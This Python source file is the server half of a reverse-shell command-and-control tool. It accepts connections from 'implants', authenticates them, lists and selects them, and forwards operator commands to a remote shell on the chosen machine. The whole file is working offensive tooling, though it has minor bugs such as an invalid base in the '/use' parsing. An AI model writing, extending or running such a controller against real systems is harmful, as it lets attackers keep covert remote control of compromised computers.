import socket
import threading

from .console import Console
from .implant import Implant, ImplantsList


class Server:
    def __init__(self, args):
        self.args = args
        self.secret = args.secret
        self.allowed = args.allowed
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.prompt = "sh3ll => "
        self.console = Console(self._handle_input, self.prompt)

        self.implants = ImplantsList() 

        self.current_implant = None

    def run(self):
        if self.args.listen:

            self.listen_thread = threading.Thread(
                target=self._listen
            )
            self.listen_thread.start()
            self.console.run()
        else:
            raise ValueError('not implemented')

        self.close()

    def close(self):
        if self.socket:
            self.socket.close()

        if self.listen_thread:
            self.listen_thread.join()

        if self.console:
            self.console.close()

    def add_implant(self, implant):
        if not any([i.id == implant.id for i in self.implants]):
            self.implants.append(implant)
        
    def remove_implant(self, implant):
        implant.close()
        self.implants.remove(implant)

        if self.current_implant and self.current_implant.id == implant.id:
            self.current_implant = None
            self.console.back()

    def _listen(self):
        self.socket.bind(("", self.args.port))
        self.socket.listen(5)


        self.console.write(f"[+] Listening on port {self.args.port}...")
        if self.secret:
            self.console.write(f"[+] Secret key: {self.secret}")

        try:
            while True:
                conn, addr = self.socket.accept()
                conn_thread = threading.Thread(
                    target=self._handle_connection, args=(conn, addr),
                    daemon=True
                )
                conn_thread.start()
        except ConnectionAbortedError:
            pass


    def _handle_connection(self, conn, addr):
        implant = Implant(self, conn, addr)

        self.console.write(f"[+] Implant connecting {addr[0]}:{addr[1]}")
        if not implant.authenticate():
            conn.close()
            return

        self.console.write(f"[+] Implant connected {addr[0]}:{addr[1]}")
        self.add_implant(implant)
        if not self.current_implant:
            self.select_implant(1)

        implant.process()
    
    def _handle_input(self, text):
        text = text.strip()
        system_command = False
        if text:
            if text.startswith("/"):
                text = text[1:]
                system_command = True

        # if no implant selected we can use only system commands 
        if not self.current_implant and not system_command:
            self.console.write("[-] No implant selected.")
            return

        if system_command:
            split = text.split(" ")
            cmd = split[0]
            args = split[1:]

            if cmd == "exit":
                if self.current_implant:
                    self.current_implant.close()
                else:
                    self.console.write("[!] Exiting...")
                    self.close()
            elif cmd == "help":
                self.print_help()
            elif cmd == "list":
                self.list_implants()
            elif cmd.startswith("use"):
                if len(args) != 1:
                    self.console.write("[-] Usage: use <implant_id>")
                    return
                self.select_implant(int(args[0], 1))
        elif self.current_implant:
            self.current_implant.send(text + "\n")
                
    def print_help(self):
        s = """
Available commands:
    /exit - Exit the program
    /help - Show this help message
    /list - List all implants
    /use <implant_id> - Select an implant to interact with
        """
        self.console.write(s)
    
    def list_implants(self):
        if not self.implants:
            self.console.write("[-] No implants connected.")
            return

        for i, implant in enumerate(self.implants):
            self.console.write(f"[+] Implants: {len(self.implants)}")
            self.console.write(f"[+] {i + 1}: {implant.addr[0]}:{implant.addr[1]}")

    def select_implant(self, index: int):
        if not self.implants:
            self.console.write("[-] No implants connected.")
            return

        implant = self.implants[index - 1]
        if implant:
            self.current_implant = implant
            self.console.set_prompt(f"[{self.current_implant.addr}] => ")
        else:
            self.console.write(f"[-] Implant not found.")
